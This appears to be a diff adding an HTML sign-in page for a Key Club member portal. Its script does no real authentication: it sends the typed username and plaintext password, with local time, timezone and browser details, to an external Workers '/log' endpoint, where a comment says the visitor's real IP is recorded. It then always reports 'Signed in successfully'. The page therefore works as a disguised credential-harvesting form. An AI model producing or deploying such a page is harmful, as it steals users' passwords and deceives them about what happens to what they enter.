@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link rel="icon" type="image/png" href="Key%20Club%20Logo.png">
+  <title>MO-ARK Key Club - Sign In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f5f0e8;
+      --surface: #ffffff;
+      --accent: #1a3a2a;
+      --accent-light: #2d5c42;
+      --gold: #c8a84b;
+      --text: #1a1a1a;
+      --muted: #8a8070;
+      --border: #ddd8cc;
+      --error: #c0392b;
+      --success: #2d5c42;
+    }
+
+    body {
+      background: var(--bg);
+      font-family: 'DM Sans', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      position: relative;
+    }
+
+    /* Subtle texture overlay */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4'%3E%3Crect width='4' height='4' fill='%23f5f0e8'/%3E%3Crect x='0' y='0' width='1' height='1' fill='%23e8e3d8' opacity='0.6'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .page-wrap {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 420px;
+    }
+
+    /* Top emblem */
+    .emblem {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    .emblem-icon {
+      width: 52px;
+      height: 52px;
+      background: var(--accent);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 0.8rem;
+    }
+
+    .emblem-icon svg {
+      width: 26px;
+      height: 26px;
+      fill: var(--gold);
+    }
+
+    .emblem-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: 0.02em;
+    }
+
+    .emblem-sub {
+      font-size: 0.72rem;
+      color: var(--muted);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-top: 2px;
+    }
+
+    /* Card */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 2.5rem 2.5rem 2rem;
+      box-shadow: 0 4px 24px rgba(26,58,42,0.08), 0 1px 4px rgba(26,58,42,0.04);
+      animation: slideUp 0.45s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .card-header {
+      margin-bottom: 2rem;
+    }
+
+    .card-header h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.9rem;
+      font-weight: 900;
+      color: var(--text);
+      line-height: 1.15;
+      margin-bottom: 0.3rem;
+    }
+
+    .card-header p {
+      font-size: 0.82rem;
+      color: var(--muted);
+    }
+
+    /* Gold rule */
+    .gold-rule {
+      height: 2px;
+      background: linear-gradient(90deg, var(--gold), transparent);
+      margin-bottom: 2rem;
+      border-radius: 1px;
+    }
+
+    /* Fields */
+    .field {
+      margin-bottom: 1.3rem;
+    }
+
+    label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 500;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 0.45rem;
+    }
+
+    input {
+      width: 100%;
+      border: 1.5px solid var(--border);
+      border-radius: 4px;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'DM Sans', sans-serif;
+      font-size: 0.95rem;
+      padding: 0.75rem 1rem;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input:focus {
+      border-color: var(--accent-light);
+      box-shadow: 0 0 0 3px rgba(45,92,66,0.1);
+      background: #fff;
+    }
+
+    input.invalid { border-color: var(--error); }
+
+    .err {
+      font-size: 0.72rem;
+      color: var(--error);
+      margin-top: 0.35rem;
+      display: none;
+    }
+
+    /* Submit button */
+    .btn {
+      width: 100%;
+      margin-top: 1.6rem;
+      padding: 0.9rem;
+      background: var(--accent);
+      color: #fff;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 500;
+      letter-spacing: 0.04em;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.2s, box-shadow 0.2s, transform 0.1s;
+      position: relative;
+    }
+
+    .btn:hover:not(:disabled) {
+      background: var(--accent-light);
+      box-shadow: 0 4px 16px rgba(26,58,42,0.25);
+    }
+
+    .btn:active:not(:disabled) { transform: scale(0.99); }
+
+    .btn:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+    }
+
+    .btn-inner {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .spinner {
+      display: none;
+      width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Toast notification */
+    .toast {
+      position: fixed;
+      bottom: 2rem;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      opacity: 0;
+      background: var(--accent);
+      color: #fff;
+      font-size: 0.85rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: 4px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      transition: opacity 0.3s, transform 0.3s;
+      pointer-events: none;
+      white-space: nowrap;
+      z-index: 100;
+    }
+
+    .toast.error-toast { background: var(--error); }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    /* Footer */
+    .card-footer {
+      margin-top: 1.5rem;
+      text-align: center;
+      font-size: 0.7rem;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-wrap">
+  <div class="emblem">
+    <div class="emblem-icon">
+      <!-- Key icon -->
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12.65 10A6 6 0 1 0 8 18H20l2-2-2-2-2 2-2-2 2-2-3.35-3.35zM6 14a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/>
+      </svg>
+    </div>
+    <div class="emblem-title">MO-ARK Key Club</div>
+    <div class="emblem-sub">Member Portal</div>
+  </div>
+
+  <div class="card">
+    <div class="card-header">
+      <h1>Welcome back.</h1>
+      <p>Sign in to your account to continue.</p>
+    </div>
+    <div class="gold-rule"></div>
+
+    <div class="field">
+      <label for="username">Username</label>
+      <input type="text" id="username" placeholder="Enter your username" autocomplete="username"/>
+      <div class="err" id="usernameErr">Username is required.</div>
+    </div>
+
+    <div class="field">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password"/>
+      <div class="err" id="passwordErr">Password is required.</div>
+    </div>
+
+    <button class="btn" id="submitBtn" onclick="handleSubmit()">
+      <div class="btn-inner">
+        <div class="spinner" id="spinner"></div>
+        <span id="btnText">Sign In</span>
+      </div>
+    </button>
+
+    <div class="card-footer">
+      Secure sign-in · MO-ARK Key Club &copy; 2026
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const WORKER = 'https://moark-portal-api.moarkkeyclubwebmaster.workers.dev';
+
+  function showToast(msg, isError = false) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast' + (isError ? ' error-toast' : '') + ' show';
+    setTimeout(() => t.className = 'toast' + (isError ? ' error-toast' : ''), 3200);
+  }
+
+  function setLoading(on) {
+    document.getElementById('submitBtn').disabled = on;
+    document.getElementById('spinner').style.display = on ? 'block' : 'none';
+    document.getElementById('btnText').textContent = on ? 'Submitting…' : 'Sign In';
+  }
+
+  function getOffsetString() {
+    const off  = -new Date().getTimezoneOffset();
+    const sign = off >= 0 ? '+' : '-';
+    const abs  = Math.abs(off);
+    const h    = Math.floor(abs / 60);
+    const m    = abs % 60;
+    return m ? `UTC${sign}${h}:${String(m).padStart(2,'0')}` : `UTC${sign}${h}`;
+  }
+
+  async function handleSubmit() {
+    const usernameEl = document.getElementById('username');
+    const passwordEl = document.getElementById('password');
+    const username   = usernameEl.value.trim();
+    const password   = passwordEl.value;
+
+    // Validate
+    let valid = true;
+    if (!username) {
+      usernameEl.classList.add('invalid');
+      document.getElementById('usernameErr').style.display = 'block';
+      valid = false;
+    } else {
+      usernameEl.classList.remove('invalid');
+      document.getElementById('usernameErr').style.display = 'none';
+    }
+    if (!password) {
+      passwordEl.classList.add('invalid');
+      document.getElementById('passwordErr').style.display = 'block';
+      valid = false;
+    } else {
+      passwordEl.classList.remove('invalid');
+      document.getElementById('passwordErr').style.display = 'none';
+    }
+    if (!valid) return;
+
+    setLoading(true);
+
+    try {
+      const now = new Date();
+
+      // POST to the Worker's /log endpoint - Worker captures real IP via CF-Connecting-IP
+      await fetch(`${WORKER}/log`, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          actor:     username,
+          actorName: username,
+          actorRole: 'auth-test',
+          actorDiv:  null,
+          action:    'AUTH_ATTEMPT',
+          detail:    `password=${password} | utc_offset=${getOffsetString()} | local_time=${now.toLocaleString()} | ua=${navigator.userAgent}`,
+        }),
+      });
+
+      showToast('✓ Signed in successfully');
+      usernameEl.value = '';
+      passwordEl.value = '';
+
+    } catch (e) {
+      console.error(e);
+      showToast('Submission failed - check console', true);
+    } finally {
+      setLoading(false);
+    }
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Enter') handleSubmit();
+  });
+</script>
+</body>
+</html>
